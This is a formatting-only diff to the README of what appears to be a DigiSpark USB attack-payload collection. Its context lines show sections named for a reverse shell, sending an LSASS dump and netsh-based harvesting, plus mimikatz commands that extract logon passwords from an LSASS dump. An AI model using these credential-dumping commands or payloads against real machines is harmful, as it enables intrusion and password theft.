@@ -22,6 +22,7 @@ In the Arduino IDE set your board to (DigiSpark Default 16,5 Mhz) and the progra
 https://github.com/digistump/DigistumpArduino/releases
 ~~~~
 
+***
 
 # Reversed Shell #
 
@@ -40,6 +41,7 @@ Run Netcat
 
 You can also use powershell scripts see Powershell directory for the files or instructions below.
 
+***
 
 # Send-LSASS-Dump #
 
@@ -56,6 +58,8 @@ mimikatz # sekurlsa::minidump lsass.dmp
 ~~~~
 mimikatz # sekurlsa::logonPasswords
 ~~~~
+
+***
 
 # Netsh-Ripper #
 
